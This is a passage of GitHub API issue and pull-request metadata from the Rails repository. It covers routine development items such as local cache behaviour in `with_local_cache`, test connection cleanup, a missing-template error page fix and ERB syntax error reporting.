        "url": "https://api.github.com/repos/rails/rails/issues/51098",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51098/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51098/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51098/events",
        "html_url": "https://github.com/rails/rails/pull/51098",
        "id": 2137621598,
        "node_id": "PR_kwDNIULOZwj18g",
        "number": 51098,
        "title": "Don't clear the local cache on each requests with `with_local_cache`:",
        "user": {
            "login": "Edouard-chin",
            "id": 8122246,
            "node_id": "MDQ6VXNlcjgxMjIyNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8122246?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Edouard-chin",
            "html_url": "https://github.com/Edouard-chin",
            "followers_url": "https://api.github.com/users/Edouard-chin/followers",
            "following_url": "https://api.github.com/users/Edouard-chin/following{/other_user}",
            "gists_url": "https://api.github.com/users/Edouard-chin/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Edouard-chin/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Edouard-chin/subscriptions",
            "organizations_url": "https://api.github.com/users/Edouard-chin/orgs",
            "repos_url": "https://api.github.com/users/Edouard-chin/repos",
            "events_url": "https://api.github.com/users/Edouard-chin/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Edouard-chin/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-15T23:38:21Z",
        "updated_at": "2024-02-15T23:39:06Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51098",
            "html_url": "https://github.com/rails/rails/pull/51098",
            "diff_url": "https://github.com/rails/rails/pull/51098.diff",
            "patch_url": "https://github.com/rails/rails/pull/51098.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThe `ActiveSupport::LocalCache::Middleware` clears the local cache after each requests, but when using the `with_local_cache` method, this could be counter intuitive as this method is supposed to use a local cache for the duration of the block:\r\n\r\n```ruby\r\nRails.cache.with_local_cache do\r\n  get \"/\" \r\n  # Before this patch: Cache is cleared here\r\nend\r\n# After this patch: Cache is cleared here\r\n```\r\n\r\nAsserting on the state of the cache in an integration test isn't possible (by default in test environment the store is a NullStore), unless the cache strategy is temporary changed.\r\nThis patch makes it easier to check the cache after a request but also allow make subsequent requests to hit the cache.\r\n\r\n```ruby\r\nRails.cache.with_local_cache\r\n  get \"/\"\r\n  get \"/\"\r\n  assert_no_cache_miss\r\nend\r\n```\r\n\r\nThis Pull Request has been created because [REPLACE ME]\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51098/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51098/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51097",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51097/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51097/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51097/events",
        "html_url": "https://github.com/rails/rails/pull/51097",
        "id": 2136387248,
        "node_id": "PR_kwDNIULOZvgUZw",
        "number": 51097,
        "title": "ActiveRecord::TestCase: reap all leaked connection on teardown",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-15T12:19:57Z",
        "updated_at": "2024-02-15T12:45:11Z",
        "closed_at": "2024-02-15T12:45:11Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51097",
            "html_url": "https://github.com/rails/rails/pull/51097",
            "diff_url": "https://github.com/rails/rails/pull/51097.diff",
            "patch_url": "https://github.com/rails/rails/pull/51097.patch",
            "merged_at": "2024-02-15T12:45:11Z"
        },
        "body": "Some tests do leak connections, which cause some other tests to stall for a very long time when they call `clear_all_connections`.\r\n\r\nEach leaked connection takes 5 seconds to be cleared because of the checkout timeout.\r\n\r\nSo on teardown to inspect all pools to make sure nothing was leaked and if some connections were leaked we cleanup the state.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51097/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51097/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51096",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51096/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51096/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51096/events",
        "html_url": "https://github.com/rails/rails/pull/51096",
        "id": 2135931898,
        "node_id": "PR_kwDNIULOZvHCcA",
        "number": 51096,
        "title": "[Fix #51095] Missing template error page showing incorrect view path example for nested controller path",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 1072773639,
                "node_id": "MDU6TGFiZWwxMDcyNzczNjM5",
                "url": "https://api.github.com/repos/rails/rails/labels/ready",
                "name": "ready",
                "color": "fef2c0",
                "default": false,
                "description": "PRs ready to merge"
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/88",
            "html_url": "https://github.com/rails/rails/milestone/88",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/88/labels",
            "id": 10422595,
            "node_id": "MI_kwDNIULOAJ8JQw",
            "number": 88,
            "title": "7.1.4",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 9,
            "closed_issues": 5,
            "state": "open",
            "created_at": "2024-01-15T23:00:48Z",
            "updated_at": "2024-02-27T02:00:26Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 0,
        "created_at": "2024-02-15T08:37:46Z",
        "updated_at": "2024-02-27T02:00:26Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51096",
            "html_url": "https://github.com/rails/rails/pull/51096",
            "diff_url": "https://github.com/rails/rails/pull/51096.diff",
            "patch_url": "https://github.com/rails/rails/pull/51096.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nFixes #51095\r\n\r\n### Detail\r\n\r\nUpdates the error page displayed when a view template is missing to account for nested controller paths in the suggested correct path for the missing template.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\nTesting steps: https://github.com/rails/rails/issues/51095#issuecomment-1945603654\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51096/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51096/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51095",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51095/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51095/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51095/events",
        "html_url": "https://github.com/rails/rails/issues/51095",
        "id": 2135927044,
        "node_id": "I_kwDNIULOf0-pBA",
        "number": 51095,
        "title": "Missing view template error page example does not account for nested controller paths",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-15T08:34:28Z",
        "updated_at": "2024-02-21T08:22:09Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\nWhen routing with nested controller paths (e.g. [in this setup](https://github.com/joshuay03/missing-exact-template-nested-controller-demo-app/blob/92fc37b932d3a224886482d968bc3472d68dee18/config/routes.rb#L8-L10)), if a view template is missing for a nested controller, the error page dsiplayed suggests the incorrect expected path for the corresponding view template. This is pretty confusing if you're seeing this error for the very first time, which is how I ran into this since it happened to one of our Junior devs.\r\n\r\n<details>\r\n<summary>Error snapshot</summary>\r\n\r\n<img width=\"1728\" alt=\"Screenshot 2024-02-15 at 6 26 49PM\" src=\"https://github.com/rails/rails/assets/54629302/c0c5c0c5-4d32-489f-a352-6e12d0c09ebe\">\r\n\r\n</details>\r\n\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n\r\nClone https://github.com/joshuay03/missing-exact-template-nested-controller-demo-app\r\nRun `bundle`\r\nRun `rails s`\r\nNavigate to `http://127.0.0.1:3000/users/1/posts`\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\n\r\nExample suggests that the view template needs to be located at `app/views/users/posts/index.html.erb.`\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\n\r\nExample suggests that the view template needs to be located at `app/views/posts/index.html.erb.`\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3, main\r\n\r\n**Ruby version**: 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51095/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51095/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51094",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51094/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51094/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51094/events",
        "html_url": "https://github.com/rails/rails/pull/51094",
        "id": 2135648713,
        "node_id": "PR_kwDNIULOZu3kHw",
        "number": 51094,
        "title": "Use consistent ENV.fetch style",
        "user": {
            "login": "anonychun",
            "id": 41361100,
            "node_id": "MDQ6VXNlcjQxMzYxMTAw",
            "avatar_url": "https://avatars.githubusercontent.com/u/41361100?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/anonychun",
            "html_url": "https://github.com/anonychun",
            "followers_url": "https://api.github.com/users/anonychun/followers",
            "following_url": "https://api.github.com/users/anonychun/following{/other_user}",
            "gists_url": "https://api.github.com/users/anonychun/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/anonychun/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/anonychun/subscriptions",
            "organizations_url": "https://api.github.com/users/anonychun/orgs",
            "repos_url": "https://api.github.com/users/anonychun/repos",
            "events_url": "https://api.github.com/users/anonychun/events{/privacy}",
            "received_events_url": "https://api.github.com/users/anonychun/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            },
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            },
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-15T05:01:19Z",
        "updated_at": "2024-02-15T08:28:06Z",
        "closed_at": "2024-02-15T05:58:21Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51094",
            "html_url": "https://github.com/rails/rails/pull/51094",
            "diff_url": "https://github.com/rails/rails/pull/51094.diff",
            "patch_url": "https://github.com/rails/rails/pull/51094.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nSimplify using `ENV.fetch` in places that do not require a block to make it more consistent.\r\n\r\n### Detail\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51094/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51094/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51093",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51093/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51093/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51093/events",
        "html_url": "https://github.com/rails/rails/pull/51093",
        "id": 2135414250,
        "node_id": "PR_kwDNIULOZurMFA",
        "number": 51093,
        "title": "Action View Test Case `rendered` memoization",
        "user": {
            "login": "seanpdoyle",
            "id": 2575027,
            "node_id": "MDQ6VXNlcjI1NzUwMjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2575027?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/seanpdoyle",
            "html_url": "https://github.com/seanpdoyle",
            "followers_url": "https://api.github.com/users/seanpdoyle/followers",
            "following_url": "https://api.github.com/users/seanpdoyle/following{/other_user}",
            "gists_url": "https://api.github.com/users/seanpdoyle/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/seanpdoyle/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/seanpdoyle/subscriptions",
            "organizations_url": "https://api.github.com/users/seanpdoyle/orgs",
            "repos_url": "https://api.github.com/users/seanpdoyle/repos",
            "events_url": "https://api.github.com/users/seanpdoyle/events{/privacy}",
            "received_events_url": "https://api.github.com/users/seanpdoyle/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-15T00:22:20Z",
        "updated_at": "2024-02-15T18:17:07Z",
        "closed_at": "2024-02-15T02:52:07Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51093",
            "html_url": "https://github.com/rails/rails/pull/51093",
            "diff_url": "https://github.com/rails/rails/pull/51093.diff",
            "patch_url": "https://github.com/rails/rails/pull/51093.patch",
            "merged_at": "2024-02-15T02:52:07Z"
        },
        "body": "### Motivation / Background\r\n\r\nThe introduction of memoization as an optimization posed a backwards incompatible change to View tests that call `render` multiple times.\r\n\r\n### Detail\r\n\r\nFollow-up to [49856][]\r\nFollow-up to [49194][]\r\n\r\nThis commit changes the `@rendered` instance variable from a `String` to an instance of the `RenderedViewContent` specialized `String` subclass.\r\n    \r\nThe end result is that there is no memoization to reset, and the memoization optimization side-effect is preserved after rendering for test cases where `rendered` (or parser methods like `rendered.html`) might be invoked more than once.\r\n\r\n[49856]: https://github.com/rails/rails/pull/49856#issuecomment-1945039015\r\n[49194]: https://github.com/rails/rails/pull/49194/files#diff-ce84a807f3491121a5230d37bd40454bb1407fcca71179e1a2fa76d4c0ddfa2aR293\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51093/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51093/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51092",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51092/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51092/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51092/events",
        "html_url": "https://github.com/rails/rails/issues/51092",
        "id": 2135303286,
        "node_id": "I_kwDNIULOf0Ykdg",
        "number": 51092,
        "title": "Syntax errors are not presented correctly in ERB templates",
        "user": {
            "login": "dhh",
            "id": 2741,
            "node_id": "MDQ6VXNlcjI3NDE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2741?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dhh",
            "html_url": "https://github.com/dhh",
            "followers_url": "https://api.github.com/users/dhh/followers",
            "following_url": "https://api.github.com/users/dhh/following{/other_user}",
            "gists_url": "https://api.github.com/users/dhh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dhh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dhh/subscriptions",
            "organizations_url": "https://api.github.com/users/dhh/orgs",
            "repos_url": "https://api.github.com/users/dhh/repos",
            "events_url": "https://api.github.com/users/dhh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dhh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/88",
            "html_url": "https://github.com/rails/rails/milestone/88",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/88/labels",
            "id": 10422595,
            "node_id": "MI_kwDNIULOAJ8JQw",
            "number": 88,
            "title": "7.1.4",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 9,
